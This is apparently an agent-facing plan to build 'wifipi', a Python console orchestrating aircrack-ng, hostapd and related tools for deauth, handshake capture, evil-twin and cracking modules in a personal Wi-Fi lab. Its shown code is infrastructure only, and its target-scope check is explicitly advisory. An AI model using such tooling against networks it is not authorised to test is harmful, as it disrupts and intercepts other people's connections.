# wifipi Console Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **Commits:** The user handles all `git commit` operations themselves. Do NOT run `git commit` during execution. "Commit checkpoint" markers in this plan are pauses for the user to commit — the executor should stop and let the user commit before continuing.

**Goal:** Replace the numbered bash scripts in `scripts/` with a single `msfconsole`-style Python REPL (`sudo ./wifipi.sh`) that provides module-based navigation, persistent session state, interface role management, background jobs, and a timestamped `loot/` tree.

**Architecture:** Python 3.10+ package (`wifipi/`) built on `cmd2`. REPL discovers `Module` subclasses under `wifipi/modules/{recon,attack,post,util}/`. Session state lives on the console (globals + interface roles). Background modules run in threads that manage a `subprocess.Popen`, with a live `[<n>j]` prompt counter and `async_alert` finish notifications. All artefacts flow into `loot/<category>/<timestamp>-<name>/`. Root-only; root check at entry. Existing bash scripts move to `scripts/legacy/` untouched.

**Tech Stack:** Python 3.10+, `cmd2` (pinned in `requirements.txt`), stdlib (`subprocess`, `threading`, `shutil`, `pathlib`, `re`, `signal`, `shlex`, `dataclasses`). External CLI: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `iw`, `hostapd`, `dnsmasq`, `iptables`, `tcpdump`. Tests: `pytest`, `pytest-mock`.

**Reference spec:** `docs/superpowers/specs/2026-04-17-wifipi-console-design.md`.

---

## File structure

```
wifipi.sh                           # shell wrapper: exec python3 -m wifipi "$@"
                                    # (file/dir name collision means the wrapper
                                    # needs a different basename than the package)
wifipi/
  __init__.py
  __main__.py                       # entry point: root check, banner, launch
  console.py                        # cmd2 App + all built-in commands
  module.py                         # Module base, OptionSpec, RunContext
  options.py                        # OptionStore with local/global resolution
  ifaces.py                         # iw dev parsing + InterfaceManager + roles
  jobs.py                           # JobManager (thread + Popen lifecycle)
  loot.py                           # LootManager (timestamped dirs, listing)
  procutil.py                       # subprocess wrappers + which()
  inventory.py                      # parser for lab-notes/inventory.md
  modules/
    __init__.py
    recon/{__init__.py, scan.py, target.py}
    attack/{__init__.py, deauth_targeted.py, deauth_broadcast.py,
            deauth_loop.py, handshake.py, handshake_dual.py,
            evil_twin.py}
    post/{__init__.py, crack.py}
    util/{__init__.py, prereq_check.py, cleanup.py}
tests/
  __init__.py
  conftest.py
  fixtures/
    iw_dev_empty.txt
    iw_dev_single.txt
    iw_dev_dual.txt
    inventory_populated.md
    inventory_empty.md
  test_procutil.py
  test_inventory.py
  test_options.py
  test_ifaces.py
  test_jobs.py
  test_loot.py
  test_module_discovery.py
  test_module_argvs.py
requirements.txt
.gitignore
scripts/legacy/                     # moved bash scripts
README.md                           # rewritten
```

---

## Task 1: Repo scaffolding

**Files:**
- Create: `requirements.txt`
- Create: `.gitignore`
- Create: `wifipi.sh` (shell wrapper)
- Create: `wifipi/__init__.py`
- Create: `wifipi/modules/__init__.py`
- Create: `wifipi/modules/recon/__init__.py`
- Create: `wifipi/modules/attack/__init__.py`
- Create: `wifipi/modules/post/__init__.py`
- Create: `wifipi/modules/util/__init__.py`
- Create: `tests/__init__.py`
- Create: `tests/conftest.py`
- Move: `scripts/*.sh` (except `lib/`) → `scripts/legacy/`
- Move: `scripts/lib/` → `scripts/legacy/lib/`

- [ ] **Step 1: Move existing bash scripts to `scripts/legacy/`**

```bash
mkdir -p scripts/legacy
git mv scripts/*.sh scripts/legacy/
git mv scripts/lib scripts/legacy/lib
ls scripts/     # should be empty or contain only legacy/
```

- [ ] **Step 2: Add `.gitignore` entries for Python, tests, loot**

File: `.gitignore` (create if it does not exist)
```
# Python
__pycache__/
*.py[cod]
*.egg-info/
.pytest_cache/
.venv/
venv/

# wifipi runtime artefacts
loot/

# Editor / OS
.DS_Store
*.swp
```

- [ ] **Step 3: Pin dependencies**

File: `requirements.txt`
```
cmd2>=2.4,<3.0
pytest>=7.4
pytest-mock>=3.12
```

- [ ] **Step 4: Create Python package skeleton**

File: `wifipi/__init__.py`
```python
"""wifipi — metasploit-style console for the Pi WiFi lab."""

__version__ = "0.1.0"
```

File: `wifipi/modules/__init__.py`
```python
"""Auto-discovered Module implementations grouped by category."""
```

File: `wifipi/modules/recon/__init__.py`
```python
```

File: `wifipi/modules/attack/__init__.py`
```python
```

File: `wifipi/modules/post/__init__.py`
```python
```

File: `wifipi/modules/util/__init__.py`
```python
```

File: `tests/__init__.py`
```python
```

File: `tests/conftest.py`
```python
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
```

- [ ] **Step 5: Create the `wifipi.sh` shell wrapper**

File: `wifipi.sh` (top-level, mode 0755). It must be named `wifipi.sh` rather than `wifipi` because a file and a directory with the same name cannot coexist in the same parent directory on Linux, and the package directory is named `wifipi/`.

```bash
#!/usr/bin/env bash
# Thin wrapper so users run `sudo ./wifipi.sh` from the repo root.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"
exec python3 -m wifipi "$@"
```

```bash
chmod +x wifipi.sh
```

- [ ] **Step 6: Verify the layout**

Run: `ls wifipi/ wifipi/modules/ scripts/legacy/ tests/`
Expected: package dirs exist, legacy/ has all 13 `.sh` files + `lib/common.sh`.

- [ ] **Step 7: Install deps**

Run: `pip install -r requirements.txt`
Expected: `cmd2`, `pytest`, `pytest-mock` installed. No errors.

- [ ] **Commit checkpoint** — stop for the user to commit "scaffold Python package skeleton; move bash scripts to legacy".

---

## Task 2: `procutil` — subprocess helpers and tool discovery

**Files:**
- Create: `wifipi/procutil.py`
- Create: `tests/test_procutil.py`

- [ ] **Step 1: Write failing tests**

File: `tests/test_procutil.py`
```python
from wifipi.procutil import which, missing_tools


def test_which_returns_path_for_existing_tool():
    assert which("sh") is not None


def test_which_returns_none_for_nonexistent():
    assert which("definitely-not-a-real-binary-xyz") is None


def test_missing_tools_filters_existing_and_absent():
    result = missing_tools(["sh", "definitely-not-a-real-binary-xyz"])
    assert result == ["definitely-not-a-real-binary-xyz"]


def test_missing_tools_returns_empty_when_all_present():
    assert missing_tools(["sh"]) == []
```

- [ ] **Step 2: Run — expect ImportError / module not found**

Run: `pytest tests/test_procutil.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'wifipi.procutil'`.

- [ ] **Step 3: Implement `procutil`**

File: `wifipi/procutil.py`
```python
"""Thin wrappers around subprocess for the console.

Exposes:
- which(tool) -> str | None        : shutil.which, isolated for mocking.
- missing_tools(names) -> list[str]: names absent from PATH.
- run(argv, **kw) -> CompletedProcess: foreground blocking call.
- popen(argv, log_path) -> Popen    : background, stdout+stderr → log_path.
- terminate(proc, timeout=3.0) -> int: SIGTERM, then SIGKILL if needed.
"""

from __future__ import annotations

import shutil
import signal
import subprocess
from pathlib import Path


def which(tool: str) -> str | None:
    return shutil.which(tool)


def missing_tools(names: list[str]) -> list[str]:
    return [n for n in names if which(n) is None]


def run(argv: list[str], *, check: bool = False, **kwargs) -> subprocess.CompletedProcess:
    """Foreground blocking subprocess call. Caller decides stdout/stderr."""
    return subprocess.run(argv, check=check, **kwargs)


def popen(argv: list[str], log_path: Path) -> subprocess.Popen:
    """Background process whose combined stdout/stderr is appended to log_path."""
    log_path.parent.mkdir(parents=True, exist_ok=True)
    fh = open(log_path, "ab", buffering=0)
    return subprocess.Popen(
        argv,
        stdout=fh,
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        start_new_session=True,
    )


def terminate(proc: subprocess.Popen, timeout: float = 3.0) -> int:
    """SIGTERM then SIGKILL. Returns the process's final returncode."""
    if proc.poll() is not None:
        return proc.returncode
    try:
        proc.send_signal(signal.SIGTERM)
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
    return proc.returncode
```

- [ ] **Step 4: Run tests — expect pass**

Run: `pytest tests/test_procutil.py -v`
Expected: 4 passed.

- [ ] **Commit checkpoint** — "add procutil: tool discovery and subprocess helpers".

---

## Task 3: `inventory` — parser for `lab-notes/inventory.md`

**Files:**
- Create: `wifipi/inventory.py`
- Create: `tests/fixtures/inventory_populated.md`
- Create: `tests/fixtures/inventory_empty.md`
- Create: `tests/test_inventory.py`

- [ ] **Step 1: Fixture — populated inventory**

File: `tests/fixtures/inventory_populated.md`
```markdown
# Lab inventory — devices in scope

## Test AP (the one we attack)

- Type: Pi #2 with hostapd
- SSID: MyTestNetwork
- BSSID (MAC): AA:BB:CC:11:22:33
- Channel: 11
- Encryption: WPA2-PSK
- Owner: me

## Test client (the victim)

- Device: Pixel 6
- MAC address (Wi-Fi): DD:EE:FF:44:55:66
- Owner: me
```

- [ ] **Step 2: Fixture — empty inventory**

File: `tests/fixtures/inventory_empty.md`
```markdown
# Lab inventory — devices in scope

## Test AP (the one we attack)

- SSID:
- BSSID (MAC):
- Channel:
```

- [ ] **Step 3: Write failing tests**

File: `tests/test_inventory.py`
```python
from pathlib import Path

from wifipi.inventory import Inventory, parse_inventory

FIXT = Path(__file__).parent / "fixtures"


def test_parses_bssids_and_macs():
    inv = parse_inventory(FIXT / "inventory_populated.md")
    assert "AA:BB:CC:11:22:33" in inv.bssids
    assert "DD:EE:FF:44:55:66" in inv.clients


def test_empty_inventory_has_no_macs():
    inv = parse_inventory(FIXT / "inventory_empty.md")
    assert inv.bssids == []
    assert inv.clients == []


def test_contains_normalises_case():
    inv = parse_inventory(FIXT / "inventory_populated.md")
    assert inv.contains("aa:bb:cc:11:22:33")
    assert inv.contains("AA:BB:CC:11:22:33")
    assert not inv.contains("FF:FF:FF:FF:FF:FF")


def test_missing_file_returns_empty_inventory():
    inv = parse_inventory(Path("/nonexistent/path.md"))
    assert inv.bssids == []
    assert inv.clients == []
```

- [ ] **Step 4: Implement inventory parser**

File: `wifipi/inventory.py`
```python
"""Parse lab-notes/inventory.md for MACs/BSSIDs the user has scoped.

Purely advisory (soft gate only). The inventory is printed at startup
and available via the `inventory` command; attack modules do not hard-
refuse unrecognised targets.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from pathlib import Path

MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b")


@dataclass
class Inventory:
    bssids: list[str] = field(default_factory=list)
    clients: list[str] = field(default_factory=list)

    def contains(self, mac: str) -> bool:
        needle = mac.upper()
        return needle in (m.upper() for m in self.bssids + self.clients)


def parse_inventory(path: Path) -> Inventory:
    inv = Inventory()
    if not path.exists():
        return inv
    text = path.read_text(encoding="utf-8", errors="replace")
    section = None
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("## "):
            heading = stripped[3:].lower()
            if "test ap" in heading or "rogue" in heading:
                section = "ap"
            elif "client" in heading or "victim" in heading:
                section = "client"
            else:
                section = None
            continue
        for mac in MAC_RE.findall(line):
            mac = mac.upper()
            if section == "client":
                inv.clients.append(mac)
            else:
                inv.bssids.append(mac)
    return inv
```

- [ ] **Step 5: Run tests**

Run: `pytest tests/test_inventory.py -v`
Expected: 4 passed.

- [ ] **Commit checkpoint** — "add inventory parser for lab-notes/inventory.md".

---

## Task 4: `options` — OptionSpec + option store

**Files:**
- Create: `wifipi/options.py`
- Create: `tests/test_options.py`

- [ ] **Step 1: Write failing tests**

File: `tests/test_options.py`
```python
import pytest

from wifipi.options import OptionSpec, OptionStore, ResolvedOption


def test_local_overrides_global():
    store = OptionStore(specs={"CHANNEL": OptionSpec(required=False, default="1")})
    store.set_global("CHANNEL", "6")
    store.set_local("CHANNEL", "11")
    resolved = store.resolve("CHANNEL")
    assert resolved == ResolvedOption(value="11", source="local")


def test_global_used_when_no_local():
    store = OptionStore(specs={"CHANNEL": OptionSpec(required=False, default="1")})
    store.set_global("CHANNEL", "6")
    assert store.resolve("CHANNEL") == ResolvedOption(value="6", source="global")


def test_default_used_when_nothing_set():
    store = OptionStore(specs={"CHANNEL": OptionSpec(required=False, default="1")})
    assert store.resolve("CHANNEL") == ResolvedOption(value="1", source="default")


def test_required_missing_is_none():
    store = OptionStore(specs={"BSSID": OptionSpec(required=True, default=None)})
    assert store.resolve("BSSID") is None


def test_missing_required_lists_gaps():
    store = OptionStore(specs={
        "BSSID": OptionSpec(required=True, default=None),
        "CLIENT": OptionSpec(required=True, default=None),
        "CHANNEL": OptionSpec(required=True, default=None),
    })
    store.set_global("BSSID", "AA:BB:CC:11:22:33")
    missing = store.missing_required()
    assert set(missing) == {"CLIENT", "CHANNEL"}


def test_unset_local_reveals_global():
    store = OptionStore(specs={"CHANNEL": OptionSpec(required=False, default="1")})
    store.set_global("CHANNEL", "6")
    store.set_local("CHANNEL", "11")
    store.unset_local("CHANNEL")
    assert store.resolve("CHANNEL") == ResolvedOption(value="6", source="global")


def test_reject_unknown_key_on_local_set():
    store = OptionStore(specs={"CHANNEL": OptionSpec(required=False, default="1")})
    with pytest.raises(KeyError):
        store.set_local("NOPE", "x")


def test_global_accepts_unknown_keys():
    """Globals are session-wide; set before a module is loaded."""
    store = OptionStore(specs={})
    store.set_global("BSSID", "AA:BB:CC:11:22:33")
    # Resolving an unknown key with only a global value still works.
    assert store.resolve("BSSID") == ResolvedOption(value="AA:BB:CC:11:22:33", source="global")
```

- [ ] **Step 2: Run — expect failure**

Run: `pytest tests/test_options.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement**

File: `wifipi/options.py`
```python
"""Option system for wifipi: per-module specs + global/local resolution.

Resolution order: local (module) → global (session) → spec default.
Globals work even without a spec, because modules are loaded lazily and
the user may set a global before selecting a module.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Literal


@dataclass
class OptionSpec:
    required: bool = False
    default: Any = None
    description: str = ""
    kind: str = "string"   # "string" | "int" | "mac" | "bssid" | "path" | "role"


@dataclass
class ResolvedOption:
    value: Any
    source: Literal["local", "global", "default"]


class OptionStore:
    def __init__(self, specs: dict[str, OptionSpec]):
        self.specs: dict[str, OptionSpec] = dict(specs)
        self._local: dict[str, Any] = {}
        self._global: dict[str, Any] = {}

    # --- mutation -------------------------------------------------------
    def set_local(self, key: str, value: Any) -> None:
        if key not in self.specs:
            raise KeyError(f"unknown option {key!r} for this module")
        self._local[key] = value

    def set_global(self, key: str, value: Any) -> None:
        self._global[key] = value

    def unset_local(self, key: str) -> None:
        self._local.pop(key, None)

    def unset_global(self, key: str) -> None:
        self._global.pop(key, None)

    def clear_locals(self) -> None:
        self._local.clear()

    # --- resolution -----------------------------------------------------
    def resolve(self, key: str) -> ResolvedOption | None:
        if key in self._local:
            return ResolvedOption(self._local[key], "local")
        if key in self._global:
            return ResolvedOption(self._global[key], "global")
        spec = self.specs.get(key)
        if spec is None or spec.default is None:
            return None
        return ResolvedOption(spec.default, "default")

    def resolve_value(self, key: str) -> Any:
        r = self.resolve(key)
        return r.value if r else None

    def resolve_all(self) -> dict[str, ResolvedOption]:
        """All keys known to the current spec, with their resolved source."""
        out: dict[str, ResolvedOption] = {}
        for key in self.specs:
            r = self.resolve(key)
            if r is not None:
                out[key] = r
            else:
                out[key] = ResolvedOption(None, "default")
        return out

    def missing_required(self) -> list[str]:
        missing = []
        for key, spec in self.specs.items():
            if not spec.required:
                continue
            r = self.resolve(key)
            if r is None or r.value in (None, ""):
                missing.append(key)
        return missing
```

- [ ] **Step 4: Run — expect pass**

Run: `pytest tests/test_options.py -v`
Expected: 8 passed.

- [ ] **Commit checkpoint** — "add option store: local/global/default resolution".

---

## Task 5: `ifaces` — parse `iw dev` and manage roles

**Files:**
- Create: `wifipi/ifaces.py`
- Create: `tests/fixtures/iw_dev_empty.txt`
- Create: `tests/fixtures/iw_dev_single.txt`
- Create: `tests/fixtures/iw_dev_dual.txt`
- Create: `tests/test_ifaces.py`

- [ ] **Step 1: Fixtures — empty, single, dual**

File: `tests/fixtures/iw_dev_empty.txt`
```
```

File: `tests/fixtures/iw_dev_single.txt`
```
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr b8:27:eb:00:00:01
		type managed
		txpower 31.00 dBm
```

File: `tests/fixtures/iw_dev_dual.txt`
```
phy#1
	Interface wlan1mon
		ifindex 5
		wdev 0x100000001
		addr 00:c0:ca:aa:bb:01
		type monitor
		txpower 20.00 dBm
phy#2
	Interface wlan2
		ifindex 6
		wdev 0x200000001
		addr 00:c0:ca:aa:bb:02
		type managed
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr b8:27:eb:00:00:01
		type managed
		txpower 31.00 dBm
```

- [ ] **Step 2: Write failing tests**

File: `tests/test_ifaces.py`
```python
from pathlib import Path

import pytest

from wifipi.ifaces import (
    InterfaceInfo,
    InterfaceManager,
    Role,
    parse_iw_dev,
)

FIXT = Path(__file__).parent / "fixtures"


def _read(name: str) -> str:
    return (FIXT / name).read_text()


def test_parse_empty():
    assert parse_iw_dev(_read("iw_dev_empty.txt")) == []


def test_parse_single_adapter():
    ifaces = parse_iw_dev(_read("iw_dev_single.txt"))
    assert ifaces == [InterfaceInfo(name="wlan0", mode="managed", phy="phy#0")]


def test_parse_dual_adapter():
    ifaces = {i.name: i for i in parse_iw_dev(_read("iw_dev_dual.txt"))}
    assert ifaces["wlan1mon"].mode == "monitor"
    assert ifaces["wlan2"].mode == "managed"
    assert ifaces["wlan0"].mode == "managed"
    assert ifaces["wlan1mon"].phy == "phy#1"


def test_manager_assign_and_lookup():
    mgr = InterfaceManager()
    mgr.assign(Role.MON, "wlan1mon")
    mgr.assign(Role.AP, "wlan2")
    assert mgr.get(Role.MON) == "wlan1mon"
    assert mgr.get(Role.AP) == "wlan2"
    assert mgr.get(Role.ATTACK) is None


def test_manager_clear():
    mgr = InterfaceManager()
    mgr.assign(Role.MON, "wlan1mon")
    mgr.clear()
    assert mgr.get(Role.MON) is None


def test_manager_rename_updates_role():
    """After airmon-ng renames wlan1 → wlan1mon, we update the role in place."""
    mgr = InterfaceManager()
    mgr.assign(Role.MON, "wlan1")
    mgr.rename(old="wlan1", new="wlan1mon")
    assert mgr.get(Role.MON) == "wlan1mon"


def test_role_from_string_accepts_aliases():
    assert Role.from_str("mon") is Role.MON
    assert Role.from_str("monitor") is Role.MON
    assert Role.from_str("attack") is Role.ATTACK
    assert Role.from_str("ap") is Role.AP
    with pytest.raises(ValueError):
        Role.from_str("bogus")
```

- [ ] **Step 3: Implement**

File: `wifipi/ifaces.py`
```python
"""Wireless interface discovery and role assignment.

Parses `iw dev` output and tracks the three session roles:
  MON    — monitor / capture adapter
  ATTACK — packet-injection adapter (can equal MON on single-adapter rigs)
  AP     — rogue-AP adapter (hostapd)
"""

from __future__ import annotations

import enum
import re
from dataclasses import dataclass


class Role(enum.Enum):
    MON = "MON_IFACE"
    ATTACK = "ATTACK_IFACE"
    AP = "AP_IFACE"

    @classmethod
    def from_str(cls, s: str) -> "Role":
        key = s.strip().lower()
        aliases = {
            "mon": cls.MON, "monitor": cls.MON,
            "attack": cls.ATTACK, "deauth": cls.ATTACK,
            "ap": cls.AP, "rogue": cls.AP,
        }
        if key in aliases:
            return aliases[key]
        raise ValueError(f"unknown role {s!r}; expected mon|attack|ap")


@dataclass(frozen=True)
class InterfaceInfo:
    name: str
    mode: str     # "managed" | "monitor" | "AP" | ...
    phy: str      # e.g. "phy#1"


_PHY_RE = re.compile(r"^(phy#\d+)")
_IFACE_RE = re.compile(r"^\s*Interface\s+(\S+)")
_TYPE_RE = re.compile(r"^\s*type\s+(\S+)")


def parse_iw_dev(text: str) -> list[InterfaceInfo]:
    """Parse the output of `iw dev`. Returns a list of InterfaceInfo."""
    current_phy: str | None = None
    current_name: str | None = None
    current_type: str | None = None
    out: list[InterfaceInfo] = []

    def _flush():
        nonlocal current_name, current_type
        if current_name is not None:
            out.append(InterfaceInfo(
                name=current_name,
                mode=current_type or "unknown",
                phy=current_phy or "",
            ))
        current_name = None
        current_type = None

    for line in text.splitlines():
        if m := _PHY_RE.match(line):
            _flush()
            current_phy = m.group(1)
            continue
        if m := _IFACE_RE.match(line):
            _flush()
            current_name = m.group(1)
            continue
        if m := _TYPE_RE.match(line):
            current_type = m.group(1)
            continue
    _flush()
    return out


class InterfaceManager:
    """Holds the mapping Role → interface name for the session."""

    def __init__(self) -> None:
        self._roles: dict[Role, str] = {}

    def assign(self, role: Role, name: str) -> None:
        self._roles[role] = name

    def get(self, role: Role) -> str | None:
        return self._roles.get(role)

    def all_assignments(self) -> dict[Role, str]:
        return dict(self._roles)

    def clear(self, role: Role | None = None) -> None:
        if role is None:
            self._roles.clear()
        else:
            self._roles.pop(role, None)

    def rename(self, old: str, new: str) -> None:
        """Airmon-ng renamed an interface (wlan1 → wlan1mon). Update any role
        that currently points at `old` to `new`."""
        for role, name in list(self._roles.items()):
            if name == old:
                self._roles[role] = new
```

- [ ] **Step 4: Run — expect pass**

Run: `pytest tests/test_ifaces.py -v`
Expected: 7 passed.

- [ ] **Commit checkpoint** — "add iface parser + role manager".

---

## Task 6: `jobs` — background job manager

**Files:**
- Create: `wifipi/jobs.py`
- Create: `tests/test_jobs.py`

- [ ] **Step 1: Write failing tests (use `sleep` as dummy subprocess)**

File: `tests/test_jobs.py`
```python
import time
from pathlib import Path

import pytest

from wifipi.jobs import JobManager, JobState


def test_start_and_kill(tmp_path):
    mgr = JobManager()
    job = mgr.start(
        name="sleep-test",
        argv=["sleep", "30"],
        log_path=tmp_path / "sleep.log",
    )
    assert job.state is JobState.RUNNING
    assert len(mgr.list()) == 1
    mgr.kill(job.id)
    # Give the JobManager's watcher thread a moment to flip state.
    for _ in range(20):
        if mgr.get(job.id).state is not JobState.RUNNING:
            break
        time.sleep(0.05)
    assert mgr.get(job.id).state is JobState.KILLED


def test_natural_finish(tmp_path):
    mgr = JobManager()
    job = mgr.start(
        name="true-test",
        argv=["sh", "-c", "exit 0"],
        log_path=tmp_path / "true.log",
    )
    for _ in range(40):
        if mgr.get(job.id).state is not JobState.RUNNING:
            break
        time.sleep(0.05)
    assert mgr.get(job.id).state is JobState.FINISHED


def test_ids_increment():
    mgr = JobManager()
    a = mgr.start(name="a", argv=["sleep", "30"], log_path=Path("/dev/null"))
    b = mgr.start(name="b", argv=["sleep", "30"], log_path=Path("/dev/null"))
    assert a.id == 0
    assert b.id == 1
    mgr.kill_all()


def test_log_file_receives_output(tmp_path):
    mgr = JobManager()
    log = tmp_path / "echo.log"
    job = mgr.start(name="echo", argv=["sh", "-c", "echo hello"], log_path=log)
    for _ in range(40):
        if mgr.get(job.id).state is not JobState.RUNNING:
            break
        time.sleep(0.05)
    assert "hello" in log.read_text()


def test_finish_callback_invoked(tmp_path):
    calls = []

    def cb(job):
        calls.append((job.id, job.name, job.state))

    mgr = JobManager(on_finish=cb)
    job = mgr.start(name="cb", argv=["sh", "-c", "exit 3"], log_path=tmp_path / "cb.log")
    for _ in range(40):
        if mgr.get(job.id).state is not JobState.RUNNING:
            break
        time.sleep(0.05)
    assert calls and calls[0][0] == job.id
    # exit 3 → FAILED (non-zero exit, not killed by us)
    assert calls[0][2] is JobState.FAILED


def test_running_count():
    mgr = JobManager()
    j = mgr.start(name="s", argv=["sleep", "30"], log_path=Path("/dev/null"))
    assert mgr.running_count() == 1
    mgr.kill(j.id)
    mgr.kill_all()
```

- [ ] **Step 2: Run — expect failure**

Run: `pytest tests/test_jobs.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement `JobManager`**

File: `wifipi/jobs.py`
```python
"""Background job manager: threads + subprocess.Popen lifecycle.

Each job runs in a watcher thread that waits on the subprocess and updates
the job's state on exit. Lightweight — no event loop required.
"""

from __future__ import annotations

import enum
import itertools
import subprocess
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

from . import procutil


class JobState(enum.Enum):
    RUNNING = "running"
    FINISHED = "finished"   # exited cleanly (returncode 0)
    FAILED = "failed"       # non-zero exit on its own
    KILLED = "killed"       # terminated by us


@dataclass
class Job:
    id: int
    name: str
    started_at: float
    log_path: Path
    proc: subprocess.Popen
    state: JobState = JobState.RUNNING
    returncode: int | None = None
    ended_at: float | None = None

    @property
    def pid(self) -> int:
        return self.proc.pid

    @property
    def elapsed(self) -> float:
        end = self.ended_at if self.ended_at else time.time()
        return end - self.started_at


OnFinish = Callable[[Job], None]


class JobManager:
    def __init__(self, on_finish: OnFinish | None = None):
        self._jobs: dict[int, Job] = {}
        self._lock = threading.Lock()
        self._ids = itertools.count()
        self._on_finish = on_finish

    def start(self, *, name: str, argv: list[str], log_path: Path) -> Job:
        proc = procutil.popen(argv, log_path)
        job = Job(
            id=next(self._ids),
            name=name,
            started_at=time.time(),
            log_path=log_path,
            proc=proc,
        )
        with self._lock:
            self._jobs[job.id] = job
        threading.Thread(target=self._watch, args=(job,), daemon=True).start()
        return job

    def _watch(self, job: Job) -> None:
        job.proc.wait()
        job.ended_at = time.time()
        job.returncode = job.proc.returncode
        if job.state is JobState.RUNNING:
            if job.returncode == 0:
                job.state = JobState.FINISHED
            else:
                job.state = JobState.FAILED
        if self._on_finish:
            try:
                self._on_finish(job)
            except Exception:
                pass  # never let a callback break the watcher

    def get(self, job_id: int) -> Job | None:
        with self._lock:
            return self._jobs.get(job_id)

    def list(self) -> list[Job]:
        with self._lock:
            return list(self._jobs.values())

    def running(self) -> list[Job]:
        return [j for j in self.list() if j.state is JobState.RUNNING]

    def running_count(self) -> int:
        return len(self.running())

    def kill(self, job_id: int, timeout: float = 3.0) -> bool:
        job = self.get(job_id)
        if job is None or job.state is not JobState.RUNNING:
            return False
        job.state = JobState.KILLED
        procutil.terminate(job.proc, timeout=timeout)
        return True

    def kill_all(self) -> None:
        for j in self.running():
            self.kill(j.id)
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_jobs.py -v`
Expected: 6 passed. These tests use real `sleep`/`sh` processes.

- [ ] **Commit checkpoint** — "add JobManager: threaded subprocess lifecycle".

---

## Task 7: `loot` — timestamped artefact directories

**Files:**
- Create: `wifipi/loot.py`
- Create: `tests/test_loot.py`

- [ ] **Step 1: Write failing tests**

File: `tests/test_loot.py`
```python
from pathlib import Path

from wifipi.loot import LootManager


def test_run_dir_creates_timestamped_subdir(tmp_path):
    mgr = LootManager(root=tmp_path)
    run = mgr.new_run("handshakes", "my-module")
    assert run.exists()
    assert run.parent == tmp_path / "handshakes"
    assert "my-module" in run.name
    # timestamp prefix: 2026-04-17_18-30-12-my-module
    assert run.name[:4].isdigit()


def test_recent_lists_most_recent_first(tmp_path):
    mgr = LootManager(root=tmp_path)
    a = mgr.new_run("scans", "scan-a")
    b = mgr.new_run("scans", "scan-b")
    c = mgr.new_run("handshakes", "hs")
    recent = mgr.recent(limit=10)
    names = [r.name for r in recent]
    assert names[0] == c.name    # newest first (insertion order works since we just made them)
    assert set(names) == {a.name, b.name, c.name}


def test_recent_filter_by_category(tmp_path):
    mgr = LootManager(root=tmp_path)
    mgr.new_run("scans", "a")
    mgr.new_run("handshakes", "b")
    mgr.new_run("scans", "c")
    runs = mgr.recent(category="scans", limit=10)
    assert len(runs) == 2
    assert all(r.parent.name == "scans" for r in runs)


def test_clean_removes_all(tmp_path):
    mgr = LootManager(root=tmp_path)
    mgr.new_run("scans", "x")
    mgr.clean()
    assert not any(tmp_path.iterdir())
```

- [ ] **Step 2: Implement**

File: `wifipi/loot.py`
```python
"""Manages the `loot/` directory: timestamped per-run subdirs + listing."""

from __future__ import annotations

import shutil
import time
from pathlib import Path


class LootManager:
    def __init__(self, root: Path):
        self.root = root
        self.root.mkdir(parents=True, exist_ok=True)

    def new_run(self, category: str, module_name: str) -> Path:
        """loot/<category>/<timestamp>-<module_name>/ — creates + returns it."""
        ts = time.strftime("%Y-%m-%d_%H-%M-%S")
        safe_name = module_name.replace("/", "-")
        run = self.root / category / f"{ts}-{safe_name}"
        run.mkdir(parents=True, exist_ok=True)
        return run

    def recent(self, category: str | None = None, limit: int = 20) -> list[Path]:
        if category:
            base = self.root / category
            candidates = list(base.iterdir()) if base.exists() else []
        else:
            candidates = []
            for sub in self.root.iterdir():
                if sub.is_dir():
                    candidates.extend(sub.iterdir())
        runs = [p for p in candidates if p.is_dir()]
        runs.sort(key=lambda p: p.stat().st_mtime, reverse=True)
        return runs[:limit]

    def clean(self) -> None:
        for child in self.root.iterdir():
            if child.is_dir():
                shutil.rmtree(child)
            else:
                child.unlink()
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/test_loot.py -v`
Expected: 4 passed.

- [ ] **Commit checkpoint** — "add LootManager: timestamped artefact dirs".

---

## Task 8: `module` — base class, `OptionSpec`, `RunContext`

**Files:**
- Create: `wifipi/module.py`

- [ ] **Step 1: Implement base Module**

File: `wifipi/module.py`
```python
"""Module base class used by every category under wifipi.modules.*."""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING, Any

from .options import OptionSpec

if TYPE_CHECKING:
    from .ifaces import InterfaceManager
    from .jobs import JobManager
    from .loot import LootManager


@dataclass
class RunContext:
    """Everything a module's run() needs that isn't an option value."""
    options: dict[str, Any]                # resolved (key → value)
    loot_dir: Path                         # pre-created, timestamped
    log_path: Path                         # inside loot_dir; "run.log"
    ifaces: "InterfaceManager"
    jobs: "JobManager"
    loot: "LootManager"


class Module:
    """Subclass this. Declare NAME / OPTIONS / BLOCKING and implement run()."""

    NAME: str = ""
    DESCRIPTION: str = ""
    CATEGORY: str = ""                     # "recon" | "attack" | "post" | "util"
    OPTIONS: dict[str, OptionSpec] = {}
    REQUIRES_TOOLS: list[str] = []
    BLOCKING: bool = True
    REQUIRES_CONFIRMATION: bool = False
    LOOT_SUBDIR: str | None = None         # e.g. "handshakes"

    def build_argv(self, opts: dict[str, Any]) -> list[str]:
        """Pure function: options → argv list. Override for background modules
        so that Console can launch them via JobManager without running the
